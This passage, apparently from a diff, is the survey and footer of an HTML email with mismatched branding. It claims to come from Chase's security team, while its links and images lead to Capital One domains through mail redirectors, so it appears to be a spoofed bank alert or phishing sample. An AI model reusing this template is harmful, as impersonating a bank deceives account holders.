+<P style=3D"MARGIN: 0px"><STRONG>Was this alert helpful?</STRONG></P></TD><=
+/TR></TBODY></TABLE>
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PAD=
+DING-RIGHT: 0px">
+<TABLE class=3Dsurveywidth cellSpacing=3D0 cellPadding=3D0 width=3D"70%" al=
+ign=3Dcenter border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica=
+, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(20,20,20); TEXT-ALIGN: center=
+; LINE-HEIGHT: 20px" width=3D"19%">
+<P style=3D"MARGIN: 0px 0px 5px"><A href=3D"https://deref-mail.com/mail/cli=
+ent/OGuijx7VCkE/dereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.=
+capitalone.com%2Ff%2Fa%2FHfcvesZC2432w0IizzJfVA%7E%7E%2FAAAAAQA%7E%2FRgRhrM=
+T8P0RpaHR0cHM6Ly9lY20uY2FwaXRhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5re=
+W91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c181VwZj=
+YXBvbmVCCgAy_D_KX8dlTyhSEWpoYXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<IMG style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica, sans-serif; C=
+OLOR: rgb(20,20,20); LINE-HEIGHT: 20px" border=3D0 alt=3DAbsolutely src=3D"=
+https://ecm.capitalone.com/Messaging/assets/images/global/survey_1_3x.png" =
+width=3D52 height=3D52></A></P>
+<P style=3D"MARGIN: 0px"><A style=3D"TEXT-DECORATION: none; COLOR: rgb(37,9=
+5,130)" href=3D"https://deref-mail.com/mail/client/OGuijx7VCkE/dereferrer/?=
+redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FHfc=
+vesZC2432w0IizzJfVA%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0RpaHR0cHM6Ly9lY20uY2FwaX=
+RhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5reW91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q=
+0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c181VwZjYXBvbmVCCgAy_D_KX8dlTyhSEWpo=
+YXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<SPAN class=3DtextLink style=3D"BORDER-BOTTOM: rgb(37,95,130) 1px solid; PA=
+DDING-BOTTOM: 1px">Absolutely</SPAN></A></P></TD>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica=
+, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(20,20,20); TEXT-ALIGN: center=
+; LINE-HEIGHT: 20px" width=3D"19%">
+<P style=3D"MARGIN: 0px 0px 5px"><A href=3D"https://deref-mail.com/mail/cli=
+ent/bgCyYDppeY4/dereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.=
+capitalone.com%2Ff%2Fa%2FIZD6q9efvgDe6VCffzmTJg%7E%7E%2FAAAAAQA%7E%2FRgRhrM=
+T8P0RpaHR0cHM6Ly9lY20uY2FwaXRhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5re=
+W91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c180VwZj=
+YXBvbmVCCgAy_D_KX8dlTyhSEWpoYXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<IMG style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica, sans-serif; C=
+OLOR: rgb(20,20,20); LINE-HEIGHT: 20px" border=3D0 alt=3DSure src=3D"https:=
+//ecm.capitalone.com/Messaging/assets/images/global/survey_2_3x.png" width=
+=3D52 height=3D52></A></P>
+<P style=3D"MARGIN: 0px"><A style=3D"TEXT-DECORATION: none; COLOR: rgb(37,9=
+5,130)" href=3D"https://deref-mail.com/mail/client/bgCyYDppeY4/dereferrer/?=
+redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FIZD=
+6q9efvgDe6VCffzmTJg%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0RpaHR0cHM6Ly9lY20uY2FwaX=
+RhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5reW91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q=
+0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c180VwZjYXBvbmVCCgAy_D_KX8dlTyhSEWpo=
+YXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<SPAN class=3DtextLink style=3D"BORDER-BOTTOM: rgb(37,95,130) 1px solid; PA=
+DDING-BOTTOM: 1px">Sure</SPAN></A></P></TD>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica=
+, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(20,20,20); TEXT-ALIGN: center=
+; LINE-HEIGHT: 20px" width=3D"19%">
+<P style=3D"MARGIN: 0px 0px 5px"><A href=3D"https://deref-mail.com/mail/cli=
+ent/gQlkQ81YRMY/dereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.=
+capitalone.com%2Ff%2Fa%2FYO7Ec9BwszCbnMnzi8SJjA%7E%7E%2FAAAAAQA%7E%2FRgRhrM=
+T8P0RpaHR0cHM6Ly9lY20uY2FwaXRhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5re=
+W91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c18zVwZj=
+YXBvbmVCCgAy_D_KX8dlTyhSEWpoYXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<IMG style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica, sans-serif; C=
+OLOR: rgb(20,20,20); LINE-HEIGHT: 20px" border=3D0 alt=3DNeutral src=3D"htt=
+ps://ecm.capitalone.com/Messaging/assets/images/global/survey_3_3x.png" wid=
+th=3D52 height=3D52></A></P>
+<P style=3D"MARGIN: 0px"><A style=3D"TEXT-DECORATION: none; COLOR: rgb(37,9=
+5,130)" href=3D"https://deref-mail.com/mail/client/gQlkQ81YRMY/dereferrer/?=
+redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FYO7=
+Ec9BwszCbnMnzi8SJjA%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0RpaHR0cHM6Ly9lY20uY2FwaX=
+RhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5reW91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q=
+0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c18zVwZjYXBvbmVCCgAy_D_KX8dlTyhSEWpo=
+YXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<SPAN class=3DtextLink style=3D"BORDER-BOTTOM: rgb(37,95,130) 1px solid; PA=
+DDING-BOTTOM: 1px">Neutral</SPAN></A></P></TD>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica=
+, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(20,20,20); TEXT-ALIGN: center=
+; LINE-HEIGHT: 20px" width=3D"19%">
+<P style=3D"MARGIN: 0px 0px 5px"><A href=3D"https://deref-mail.com/mail/cli=
+ent/re7mm3qk5gM/dereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.=
+capitalone.com%2Ff%2Fa%2FjFGNqZqT0_BbKyw6E3KIPQ%7E%7E%2FAAAAAQA%7E%2FRgRhrM=
+T8P0RpaHR0cHM6Ly9lY20uY2FwaXRhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5re=
+W91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c18yVwZj=
+YXBvbmVCCgAy_D_KX8dlTyhSEWpoYXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<IMG style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica, sans-serif; C=
+OLOR: rgb(20,20,20); LINE-HEIGHT: 20px" border=3D0 alt=3D"Not Really" src=
+=3D"https://ecm.capitalone.com/Messaging/assets/images/global/survey_4_3x.p=
+ng" width=3D52 height=3D52></A></P>
+<P style=3D"MARGIN: 0px"><A style=3D"TEXT-DECORATION: none; COLOR: rgb(37,9=
+5,130)" href=3D"https://deref-mail.com/mail/client/re7mm3qk5gM/dereferrer/?=
+redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FjFG=
+NqZqT0_BbKyw6E3KIPQ%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0RpaHR0cHM6Ly9lY20uY2FwaX=
+RhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5reW91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q=
+0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c18yVwZjYXBvbmVCCgAy_D_KX8dlTyhSEWpo=
+YXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<SPAN class=3DtextLink style=3D"BORDER-BOTTOM: rgb(37,95,130) 1px solid; PA=
+DDING-BOTTOM: 1px">Not&nbsp;Really</SPAN></A></P></TD>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica=
+, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(20,20,20); TEXT-ALIGN: center=
+; LINE-HEIGHT: 20px" width=3D"19%">
+<P style=3D"MARGIN: 0px 0px 5px"><A href=3D"https://deref-mail.com/mail/cli=
+ent/TiT16tFe_5c/dereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.=
+capitalone.com%2Ff%2Fa%2FDNmFAem46YBuBE1ZmaxO4g%7E%7E%2FAAAAAQA%7E%2FRgRhrM=
+T8P0RpaHR0cHM6Ly9lY20uY2FwaXRhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5re=
+W91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c18xVwZj=
+YXBvbmVCCgAy_D_KX8dlTyhSEWpoYXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<IMG style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, helvetica, sans-serif; C=
+OLOR: rgb(20,20,20); LINE-HEIGHT: 20px" border=3D0 alt=3DNope src=3D"https:=
+//ecm.capitalone.com/Messaging/assets/images/global/survey_5_3x.png" width=
+=3D52 height=3D52></A></P>
+<P style=3D"MARGIN: 0px"><A style=3D"TEXT-DECORATION: none; COLOR: rgb(37,9=
+5,130)" href=3D"https://deref-mail.com/mail/client/TiT16tFe_5c/dereferrer/?=
+redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FDNm=
+FAem46YBuBE1ZmaxO4g%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0RpaHR0cHM6Ly9lY20uY2FwaX=
+RhbG9uZS5jb20vTWVzc2FnaW5nL3BhZ2VzL2VuLXRoYW5reW91Lmh0bWw_ZXh0ZXJuYWxfaWQ9Q=
+0FSRF9BTEVSVF8xMTAzNi0xX1NMUkFDUl9lbi11c18xVwZjYXBvbmVCCgAy_D_KX8dlTyhSEWpo=
+YXJ0b25nQG1haWwuY29tWAQAAAAA" target=3D_blank>
+<SPAN class=3DtextLink style=3D"BORDER-BOTTOM: rgb(37,95,130) 1px solid; PA=
+DDING-BOTTOM: 1px">Nope</SPAN></A></P></TD></TR></TBODY></TABLE></TD></TR><=
+/TBODY></TABLE>
+<TABLE class=3Dfooter cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=
+=3D0>
+<TBODY>
+<TR>
+<TD class=3Dwebfont style=3D"COLOR: rgb(103,104,104); PADDING-BOTTOM: 20px;=
+ TEXT-ALIGN: left; PADDING-TOP: 20px; FONT: 10px/16px arial, helvetica, san=
+s-serif; PADDING-LEFT: 25px; PADDING-RIGHT: 25px">
+<H2 style=3D"FONT-SIZE: 10px; FONT-WEIGHT: bold; MARGIN: 0px 0px 16px; LINE=
+-HEIGHT: 16px">Important Information from Chase Security Team </H2>
+<P style=3D"MARGIN: 0px 0px 16px"><A style=3D"TEXT-DECORATION: none; COLOR:=
+ rgb(103,104,104)" href=3D"https://deref-mail.com/mail/client/N6QThPcmv1w/d=
+ereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2F=
+f%2Fa%2FysTOV3GP8Y6d1Msf3DDeqQ%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0Q0aHR0cHM6Ly9=
+3d3cuY2FwaXRhbG9uZS5jb20vc3VwcG9ydC1jZW50ZXIvY29udGFjdC11c1cGY2Fwb25lQgoAMv=
+w_yl_HZU8oUhFqaGFydG9uZ0BtYWlsLmNvbVgEAAAAAA%7E%7E" target=3D_blank>
+<SPAN class=3DtextLink style=3D"BORDER-BOTTOM: rgb(103,104,104) 1px solid; =
+PADDING-BOTTOM: 0px">Contact Us</SPAN></A>
+ &nbsp;&nbsp;|&nbsp;&nbsp;<A style=3D"TEXT-DECORATION: none; COLOR: rgb(103=
+,104,104)" href=3D"https://deref-mail.com/mail/client/oz86keE3luk/dereferre=
+r/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2F=
+gaZ9_V4GkC3RQKbkcL0_Ug%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0QiaHR0cHM6Ly93d3cuY2F=
+waXRhbG9uZS5jb20vcHJpdmFjeVcGY2Fwb25lQgoAMvw_yl_HZU8oUhFqaGFydG9uZ0BtYWlsLm=
+NvbVgEAAAAAA%7E%7E" target=3D_blank><SPAN class=3DtextLink style=3D"BORDER-=
+BOTTOM: rgb(103,104,104) 1px solid; PADDING-BOTTOM: 0px">
+ Privacy</SPAN></A>&nbsp;&nbsp;|&nbsp;&nbsp;<A style=3D"TEXT-DECORATION: no=
+ne; COLOR: rgb(103,104,104)" href=3D"https://deref-mail.com/mail/client/8Tm=
+swWOSBVQ/dereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.capital=
+one.com%2Ff%2Fa%2FjK35jJ-iOEuZ0FlVJlW-Gw%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0RHa=
+HR0cHM6Ly93d3cuY2FwaXRhbG9uZS5jb20vYXBwbGljYXRpb25zL2lkZW50aXR5LXByb3RlY3Rp=
+b24vY29tbWl0bWVudC9XBmNhcG9uZUIKADL8P8pfx2VPKFIRamhhcnRvbmdAbWFpbC5jb21YBAA=
+AAAA%7E" target=3D_blank>
+ <SPAN class=3DtextLink style=3D"BORDER-BOTTOM: rgb(103,104,104) 1px solid;=
+ PADDING-BOTTOM: 0px">Help Prevent Fraud</SPAN></A></P>
+<P style=3D"MARGIN: 0px 0px 16px">To ensure delivery, add<SPAN>&nbsp;chase<=
+/SPAN><A style=3D"TEXT-DECORATION: none; COLOR: rgb(103,104,104)" href=3D"m=
+ailto:chase@notification.chase.com" target=3D_blank><SPAN style=3D"TEXT-DEC=
+ORATION: none">@notification.chase.com</SPAN></A><SPAN>&nbsp;</SPAN>to your=
+ address book.</P>
+<P style=3D"MARGIN: 0px 0px 16px">This email was sent to<SPAN><STRONG>&nbsp=
+;zingerpie@kfcreview.com</STRONG></SPAN><SPAN>&nbsp;</SPAN>and contains inf=
+ormation directly related to your account with us, other services to which =
+you have subscribed, and/or any application you may have submitted.</P>
+<P style=3D"MARGIN: 0px 0px 16px">
+<A style=3D"TEXT-DECORATION: none; COLOR: rgb(103,104,104)"=20
+href=3D"https://deref-mail.com/mail/client/-G6z2dTnXS4/dereferrer/?redirect=
+Url=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FfadIbBPkpU_=
+m4zRmr-LLFQ%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0TgaHR0cHM6Ly9tZXNzYWdpbmcuY2FwaX=
+RhbG9uZS5jb20vc25hcC1hcHAtY2xvdWQtd2ViL0ludGVyYWN0aXZlUmVzcG9uc2VDb250cm9sb=
+GVyP2ludGVyYWN0aXZlU2Vzc2lvbklkPTVmY2EzZmZjM2NiMzI0NmRkZjRiNzVkMiZpbnRlcmFj=
+dGl2ZVNlcXVlbmNlSWQ9MSZjYXBhYmlsaXR5PU9ORS1DTElDSy1PUFQtT1VUJm1lc3NhZ2VUeXB=
+lQ29kZT1TTFJBQ1ImZXJyb3JUZW1wbGF0ZUlkPTEwMjJXBmNhcG9uZ
+ UIKADL8P8pfx2VPKFIRamhhcnRvbmdAbWFpbC5jb21YBAAAAAA%7E" target=3D_blank><SP=
+AN style=3D"BORDER-BOTTOM: rgb(103,104,104) 1px solid; PADDING-BOTTOM: 0px"=
+>Unsubscribe with one click<SPAN>&nbsp;</SPAN></SPAN></A>if you no longer w=
+ant to receive this account alert.</P>
+<P style=3D"MARGIN: 0px 0px 16px">The site may be unavailable during normal=
+ maintenance or due to unforeseen circumstances.</P>
+<P style=3D"MARGIN: 0px 0px 16px">Chase does not provide, endorse or guaran=
+tee any third-party product, service, information or recommendation listed =
+above. The third parties listed are not affiliated with chase and are solel=
+y responsible for their products and services. All trademarks are the prope=
+rty of their respective owners.</P>
+<P style=3D"MARGIN: 0px 0px 16px">Please do not reply to this message, as t=
+his email inbox is not monitored.<SPAN>&nbsp;</SPAN>
+ <A style=3D"TEXT-DECORATION: none; COLOR: rgb(103,104,104)" href=3D"https:=
+//deref-mail.com/mail/client/N6QThPcmv1w/dereferrer/?redirectUrl=3Dhttps%3A=
+%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FysTOV3GP8Y6d1Msf3DDeqQ%7E=
+%7E%2FAAAAAQA%7E%2FRgRhrMT8P0Q0aHR0cHM6Ly93d3cuY2FwaXRhbG9uZS5jb20vc3VwcG9y=
+dC1jZW50ZXIvY29udGFjdC11c1cGY2Fwb25lQgoAMvw_yl_HZU8oUhFqaGFydG9uZ0BtYWlsLmN=
+vbVgEAAAAAA%7E%7E" target=3D_blank><SPAN class=3DtextLink style=3D"BORDER-B=
+OTTOM: rgb(103,104,104) 1px solid; PADDING-BOTTOM: 0px">
+To contact us, visit www.chase.com/support-center/contact-us.</SPAN></A></P=
+>
+<P style=3D"MARGIN: 0px 0px 16px">Products and services are offered by chas=
+e&nbsp;Bank (USA), N.A., and Chase , N.A., Members FDIC.</P>
+<P style=3D"MARGIN: 0px 0px 16px">&copy; 2024 Chase.com &nbsp;is a federall=
+y registered service mark.</P>
+<P style=3D"MARGIN: 0px"><SPAN class=3Dinfo>SLRACR 11036 11187</SPAN></P></=
+TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
